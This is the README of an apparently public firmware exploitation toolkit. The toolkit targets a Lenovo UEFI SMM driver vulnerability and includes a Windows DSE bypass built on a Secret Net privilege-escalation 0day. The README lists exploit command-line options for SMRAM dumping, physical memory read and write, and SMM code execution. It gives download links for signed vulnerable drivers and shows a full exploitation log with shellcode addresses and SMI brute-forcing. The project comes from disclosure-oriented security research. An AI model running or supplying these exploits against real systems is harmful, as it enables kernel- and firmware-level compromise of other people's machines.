
  PC firmware exploitation tool and library

*****************************************************************

To learn more about this project please read "Exploiting SMM callout vulnerabilities in Lenovo firmware" article in my blog: 

http://blog.cr4.sh/2016/02/exploiting-smm-callout-vulnerabilities.html


Project includes the following components:

  * src/libfwexpl — Hardware abstraction library for Windows (see include/libfwexpl.h).
 
  * src/libdsebypass — Windows x64 DSE bypass exploit based on Secret Net 7.4 0day privileges escalation vulnerability (see include/libdsebypass.h).
 
  * src/driver — Kernel mode part of libfwexpl.
 
  * src/application — Application that implements System Management Mode code execution exploit for 1day vulnerability in SystemSmmAhciAspiLegacyRt UEFI SMM driver of Lenovo firmware.


Exploit for SystemSmmAhciAspiLegacyRt driver supports the following targets:

  * Lenovo ThinkPad T450s with 1.11 firmware.

  * Lenovo ThinkPad X230 with 2.61 firmware.

However, it seems that vulnerable UEFI SMM driver presents in all of the modern ThinkPads firmware and probably some other Lenovo computers. To add your own model or firmware version support to this exploit — please refer to mentioned article.

Lenovo security advisory and patches information:

https://support.lenovo.com/sg/en/product_security/smm_attack


Standalone version of local privileges escalation exploit for Secret Net 7.4 and Secret Net Studio 8.0 0day vulnerability is available as separate project:

https://github.com/Cr4sh/secretnet_expl


To run System Management Mode exploit from command line you can use bin/fwexpl_app_amd64.exe program, here's the list of available command line options:

  --target <N> — Select known target where <N> is a target number. If --target and --target-addr options are not specified — exploit will use heuristics to find EFI_BOOT_SERVICES structure address that neccessary for SystemSmmAhciAspiLegacyRt driver vulnerability exploitation.
  
  --target-list — Print all known targets information.

  --target-addr - Use manual address of EFI_BOOT_SERVICES.LocateProtocol field for SystemSmmAhciAspiLegacyRt exploit. This option will be ignored if --target was specified.

  --target-smi - Use manual SMI handler number for SystemSmmAhciAspiLegacyRt exploit. This option will be ignored if --target was specified. If --target-addr was specified without --target-smi — SystemSmmAhciAspiLegacyRt exploit will check all of the possible SMI handlers from 0 to 255.

  --smram-dump — Determinate current SMRAM address and dump it's contents to file specified by --file option.

  --phys-mem-dump — Full raw physical memory dump into the file specified by --file option.
  
  --phys-mem-read <addr> — Read physical memory starting from specified address.
  
  --phys-mem-write <addr> — Write physical memory starting from specified address.
  
  --length <bytes> — Number of bytes to read or write for --phys-mem-read and --phys-mem-write.  
  
  --file <path> — Memory dump path to read or write, in case of --phys-mem-read this parameter is optional and when it's not specified — application will print a hex dump of physical memory to stdout. In case of --smram-dump this parameter is mandatory.
  
  --exec <addr> — Execute SMM code at specified physical memory address.

  --dse-bypass — Install and exploit Secret Net 7.4 driver to bypass Windows x64 DSE.  

  --test — Run some basic libfwexpl tests.


==============================

NOTE:

By default, curent version of the program doesn't need it's own kernel mode driver that located in src/driver because it uses digitally signed driver from RWEverything (http://rweverything.com/) to implement libfwexpl API on the top of it.

If you want to use unsigned driver and DSE bypass exploit for Secret Net please remove USE_RWDRV from config.h and rebuild the project from the source code. If USE_RWDRV is enabled -- be sure that RwDrv.sys is located in the same directory with fwexpl_app_amd64.exe, this file can be downloaded here: 

https://mega.nz/#!CNNA0SoC!Z2Xi2icwX4d4jzW016dKnKGhVglWmSSPpgiRU7VCG6g

Also, --dse-bypass option requires sncc0.sys file (digitally signed vulnerable driver from Secret Net) in the same directory with fwexpl_app_amd64.exe, this file can be downloaded here: 

https://mega.nz/#!ydEnSabK!H63Yw44POR0dO02WAh-f1eqgHaWeeqlqP75_XwIzw_4

==============================


Usage examples:

C:\> fwexpl_app_amd64.exe --smram-dump --file TSEG.bin --dse-bypass
NtOpenFile() fails; status: 0xc0000034
InfLoadDriver(): Exit code = 0
OpenAndStartService(): Service "sncc0" started
NT version is 6.2.9200
nt!ExAllocatePool() is at 0xfffff8034d76f710
nt!HalDispatchTable is at 0xfffff8034d959780
Shellcode size is 0x870 bytes
Shellcode is allocated at 0x0000100804020000
Address of the ring0 payload handler is 0x00001008040200c9
Opengin device "\\.\Global\SNCC0_Sys"...
IRP user buffer address is 0x000000000014f800
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
expl_SNCC0_Sys_220010(): Exploitation success
Opening service...
OK
Stopping service...
OK
Deleting service...
OK
kernel_expl_load_driver(): Driver loaded at 0xffffe000d0694000
Host bridge VID = 0x8086, DID = 0x1604
SMRAM is at 0xad000000:0xad7fffff
hal!HalEfiRuntimeServicesTable is at 0xfffff8034d6631b8
hal!HalEfiRuntimeServicesTable value is 0xfffff8034d663160
EFI_RUNTIME_SERVICES.GetVariable() is at 0xfffffffffef55c08
EFI image is at 0xfffffffffef55000 (8640 bytes)
EFI_BOOT_SERVICES address is 0x00000000a11a6610
EFI_BOOT_SERVICES.LocateProtocol address is 0xa11a6750
SMM payload handler address is 0x1149ce8b0 with context at 0x1a477bb8
Physical memory for shellcode allocated at 0xaa75f000
Old pointer 0xa11a6750 value is 0x0
Generating software SMI 0...
expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation fails
Generating software SMI 1...
expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation fails
Generating software SMI 2...
expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation fails
Generating software SMI 3...
expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation success
8388608 bytes written to the "TSEG.bin"
Press any key to quit...


Reading and writing memory:

  > fwexpl_app_amd64.exe --target 1 --phys-mem-read 0x86000000 --size 0x1000 — Read 4096 bytes of physical memory starting from 0x86000000 and print it's hexadecimal dump to stdout.

  > fwexpl_app_amd64.exe --target 1 --phys-mem-write 0x86000000 --file mem.bin — Read data stored in mem.bin file and copy it to physical memory starting from 0x86000000.

  > fwexpl_app_amd64.exe --target 1 --phys-mem-dump --file physmem.bin — Perform raw physical memory dump using SMM vulnerability.


To compile a whole project from the source code:

  1) Download and install WDK for Windows 7 or later.

  2) Open WDK build environment for 64-bit versions of Windows.

  3) Change current directory to src/ and run build_amd64.bat scenario.


Written by:
Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com
http://blog.cr4.sh

